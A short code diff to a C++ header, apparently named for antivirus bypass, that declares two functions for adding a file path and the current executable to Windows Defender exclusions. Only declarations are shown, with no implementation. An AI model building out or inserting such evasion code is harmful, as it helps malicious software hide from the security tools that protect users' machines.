@@ -4,5 +4,9 @@
 
 #ifndef AV_BYPASS_H
 #define AV_BYPASS_H
+#include <string>
+
+bool AddToDefenderExclusions(const std::wstring& filePath);
+bool AddCurrentExecutableToDefenderExclusions();
 
 #endif //AV_BYPASS_H
